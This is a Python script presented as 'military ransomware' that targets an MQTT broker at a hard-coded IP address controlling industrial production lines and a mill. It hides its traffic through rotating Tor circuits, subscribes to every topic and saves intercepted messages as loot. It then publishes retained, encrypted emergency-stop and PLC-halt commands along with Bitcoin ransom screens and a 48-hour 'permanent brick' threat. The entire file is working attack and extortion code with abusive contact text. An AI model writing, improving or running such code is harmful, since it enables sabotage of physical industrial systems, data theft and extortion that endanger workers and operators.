#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.0 - TRUSTEDF57 OPS
# AES-256-CBC + TOR Rotation + LCD-like UI
import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket, subprocess
import qrcode
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import socks, requests
from stem import Signal
from stem.control import Controller

class MilitaryRansomware:
    def __init__(self):
        self.target_ip = "67.218.246.15"
        self.broker_port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "nomoneyfuckoff"  # Sostituisci!
        self.ransom_amount = "2.5"  # BTC
        
        # AES-256-CBC Master Key
        self.aes_key = os.urandom(32)  # 256-bit key
        self.iv = os.urandom(16)       # 128-bit IV
        
        # TOR Rotation ogni 10min
        self.tor_controller = None
        self.init_tor()
        
        self.mqtt_client = mqtt.Client("TRUSTEDF57-MIL-CMD", clean_session=False)
        self.mqtt_client.on_connect = self.on_connect
        self.mqtt_client.on_message = self.on_message
        self.locked_status = False
        
        # Salva chiave per debug (SOLO PER TEST!)
        with open("TRUSTEDF57_key.aes", "wb") as f:
            f.write(self.aes_key + self.iv)
        print("[KEY] AES-256 Key+IV salvata in TRUSTEDF57_key.aes")
    
    def init_tor(self):
        """TOR SOCKS5 + Auto-Rotation"""
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
            print("[TOR] Inizializzato + NEWNYM")
        except Exception as e:
            print(f"[TOR] Errore: {e}")
    
    def rotate_tor(self):
        """New circuit ogni 10min"""
        while True:
            time.sleep(600)
            try:
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                print("[TOR] 🔄 NEW CIRCUIT")
            except: pass
    
    def aes256_cbc_encrypt(self, plaintext):
        """AES-256-CBC Encrypt con PKCS7 padding"""
        # Padding
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext)
        padded_data += padder.finalize()
        
        # IV + Cipher
        cipher = Cipher(
            algorithms.AES(self.aes_key),
            modes.CBC(self.iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        return self.iv + ciphertext  # Prepend IV
    
    def aes256_cbc_decrypt(self, ciphertext):
        """AES-256-CBC Decrypt (per test/debug)"""
        iv = ciphertext[:16]
        ct = ciphertext[16:]
        
        cipher = Cipher(
            algorithms.AES(self.aes_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ct) + decryptor.finalize()
        
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
        return plaintext
    
    def lcd_ui(self):
        """Military LCD Lock Screen"""
        os.system('clear')
        print("="*70)
        print("🔴 MILITARY LOCKOUT ACTIVE - TRUSTEDF57 OPS")
        print("="*70)
        print(f"   TARGET: {self.target_ip}:{self.broker_port} | MOSQUITTO 2.0.14")
        print(f"   STATUS: {'🔒 PRODUCTION LOCKED' if self.locked_status else '⚠️  ARMING'}")
        print(f"   WALLET: {self.btc_addr}")
        print(f"   RANSOM: {self.ransom_amount} BTC")
        print(f"   CRYPTO: AES-256-CBC | KEY-ID: {base64.b64encode(self.aes_key)[:16].decode()}")
        print(f"   TOR: ACTIVE | CIRCUIT: ROTATING")
        print("="*70)
        print("   💰 PAY OR PERMANENT SHUTDOWN INITIATED")
        print("   📧 suckmydick@protonmail.com")
        print("="*70)
    
    def deploy_lockout(self):
        """Inject Ransom su tutti topic critici"""
        payloads = {
            # EMERGENCY STOP ALL
            "Linea5ResultsFromCyclicRead/Alarms_DB4": self.inject_military_payload("EMERGENCY_STOP"),
            "Linea4ResultsFromCyclicRead/Alarms_DB4": self.inject_military_payload("PLC_HALT"),
            "MoliendaResultsFromCyclicRead/Plc": self.inject_military_payload("MILL_LOCKOUT"),
            
            # LCD Screens everywhere
            "Linea5ResultsFromCyclicRead/Events": self.ransom_screen(),
            "Linea4ResultsFromCyclicRead/Events": self.ransom_screen(),
            "System/Diagnostics/P1-Sources/L4_L5_Molienda": self.ransom_screen(),
            
            # Persist (Retained)
            "$SYS/broker/ransom/TRUSTEDF57": f"MIL-LOCK:{self.btc_addr}:{self.ransom_amount}",
        }
        
        for topic, payload in payloads.items():
            # ENCRYPT PAYLOAD!
            enc_payload = self.aes256_cbc_encrypt(payload.encode())
            self.mqtt_client.publish(topic, base64.b64encode(enc_payload), qos=2, retain=True)
            print(f"[🔒 INJECT] {topic} -> AES-256-CBC LOCKED")
        
        self.locked_status = True
        print("[+] LOCKOUT DEPLOYED - SISTEMA BLOCCATO")
    
    def inject_military_payload(self, command):
        """Payload militare (verrà encryptato)"""
        data = {
            "op": self.op_name,
            "cmd": command,
            "timestamp": time.time(),
            "target": self.target_ip,
            "aes_key_id": base64.b64encode(self.aes_key)[:16].decode()
        }
        return json.dumps(data)
    
    def ransom_screen(self):
        """Full LCD ransom display"""
        return json.dumps({
            "STATUS": "MILITARY_LOCKOUT_ACTIVE",
            "OP": "TRUSTEDF57",
            "PAYMENT": f"{self.ransom_amount} BTC -> {self.btc_addr}",
            "DECRYPT_KEY": "SEND_PROOF -> unlock@protonmail.com",
            "COUNTDOWN": "48h -> PERMANENT_BRICK",
            "CRYPTO": "AES-256-CBC"
        })
    
    def on_connect(self, client, userdata, flags, rc):
        print(f"[+] ✅ TRUSTEDF57 connesso a {self.target_ip}:{self.broker_port}")
        print(f"[SUB] # + $SYS/#")
        client.subscribe("#", qos=2)  # Tutto
        client.subscribe("$SYS/#", qos=1)
        time.sleep(2)
        self.deploy_lockout()
    
    def on_message(self, client, userdata, msg):
        try:
            enc_payload = base64.b64decode(msg.payload)
            plaintext = self.aes256_cbc_decrypt(enc_payload).decode()
            print(f"[💾 EXFIL] {msg.topic}: {plaintext[:100]}...")
            
            # Salva DECRYPTATO
            safe_topic = msg.topic.replace('/', '_')
            with open(f"mil_loot_{safe_topic}.txt", "a") as f:
                f.write(f"[{time.ctime()}] {plaintext}\n")
                
            # Salva ENCRYPTATO
            with open(f"mil_loot_{safe_topic}.aes", "ab") as f:
                f.write(enc_payload + b"\n")
                
        except Exception as e:
            print(f"[EXFIL] Errore {msg.topic}: {e}")
    
    def run(self):
        print("🚀 TRUSTEDF57 MILITARY RANSOMWARE v2.0 AES-256-CBC DEPLOY")
        threading.Thread(target=self.rotate_tor, daemon=True).start()
        
        while True:
            self.lcd_ui()
            try:
                self.mqtt_client.loop(timeout=1)
            except:
                print("[MQTT] Riconnessione...")
                self.mqtt_client.reconnect()
            time.sleep(2)

if __name__ == "__main__":
    rw = MilitaryRansomware()
    rw.run()
